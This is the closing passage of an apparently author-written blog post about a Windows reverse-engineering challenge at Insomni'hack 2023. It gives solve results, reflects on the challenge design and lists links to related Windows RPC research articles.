In the end, only 3 teams were able to solve this challenge. I was afraid no one would be able to complete it within the given timeframe, so I'm very pleased with this result. Honestly, if I had to do this challenge myself in such a limited time, I'm not even sure I would have been able to solve it.

![Challenge results](/assets/posts/2023-01-28-insomnihack-2023-insobug/09_challenge-results.png)
_Challenge results_

When developing this challenge, I assumed that the participants would not necessarily have all the required Windows knowledge beforehand. However, I also assumed that they were far better than me when it comes to reverse engineering. This approach allowed to focus on the most interesting aspects of the challenge, which turned out to be a good balance overall.

## Links & Resources

- Insomni'hack  
[https://www.insomnihack.ch/](https://www.insomnihack.ch/)
- From RpcView to PetitPotam  
[https://itm4n.github.io/from-rpcview-to-petitpotam/](https://itm4n.github.io/from-rpcview-to-petitpotam/)
- Offensive Windows IPC Internals 2: RPC  
[https://csandker.io/2021/02/21/Offensive-Windows-IPC-2-RPC.html](https://csandker.io/2021/02/21/Offensive-Windows-IPC-2-RPC.html)